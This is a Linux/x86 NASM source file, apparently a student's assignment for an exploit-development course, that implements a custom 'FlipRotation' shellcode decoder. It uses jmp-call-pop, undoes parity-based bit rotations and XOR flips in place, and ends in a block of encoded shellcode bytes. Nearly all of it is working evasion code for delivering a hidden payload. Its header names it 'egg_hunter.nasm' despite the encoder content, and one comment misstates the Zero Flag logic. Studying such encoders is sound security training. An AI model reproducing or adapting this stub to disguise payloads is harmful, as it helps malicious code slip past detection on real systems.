; Student ID   : PA-31319
; Student Name : Eduardo Silva
; Assignment 4 : Custom Encoder/Decoder Shellcode (Linux/x86) Assembly - FlipRotation Encoder
; File Name    : egg_hunter.nasm

global _start

section .text
_start:

	jmp short call_decoder

decoder:

	pop esi
	lea edi, [esi+1]	; pointing to second byte (0x02) from shellcode
	xor eax, eax		; keep track parity byte
	cdq					; zeroes edx
	mov al,	1 
	xor ecx, ecx		; loop index and number of rotation bits
	xor ebx, ebx
	

decode:
	mov bl, byte [esi + eax]	; mov parity byte to bl
	xor bl, 0xa0				; check if reached the end marker | 0xa0 ^ 0xff = 0x5f
	jz short EncodedShellcode	; reached the marker if Zero Flag not set

	xor bl, 0x5f				; if equal, parity is even (0xff) and sets ZF
	mov bl, byte [esi + edx] 
	jnz odd

even:	; rotate right

	ror bl, cl
	jmp short bitFlip

odd: 	; rotate left

	rol bl, cl

bitFlip:

	xor bl, 0x01

restore_next_byte:

	mov byte [esi + edx], bl		; replaces the original byte
	mov bl, byte [esi + eax + 1] 	; mov next encoded byte
	mov byte [edi], bl				; change last used parity byte for the next encoded byte
	inc edi							; edi points to position of the next parity
	add al, 2						; offset added to next parity byte
	inc dl							; offset to the next encoded byte
	inc cl 							; loop index value incremented

	; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 bits (al register). 

	cmp cl, 0x08	; if equal ZF will be set meaning we have a complete rotation
	jnz decode		; jump if rotation is not complete
	xor ecx, ecx	; if rotation is complete, reset cl to start again the "circular array"

	jmp short decode

call_decoder:

	call decoder
	EncodedShellcode: db 0x30,0x02,0x83,0xff,0x45,0xff,0x4b,0xff,0xe2,0x02,0x71,0x02,0xc9,0x02,0xb4,0xff,0x69,0xff,0x17,0x02,0x8d,0xff,0xd,0x02,0xf6,0xff,0x44,0x02,0x8b,0x02,0xa8,0xff,0x88,0x02,0xc7,0xff,0x94,0x02,0x11,0x02,0xe,0x02,0x36,0xff,0x28,0x02,0x99,0x02,0x81,0xff,0xa0,0xa0 	; 0xa0 is the stop marker

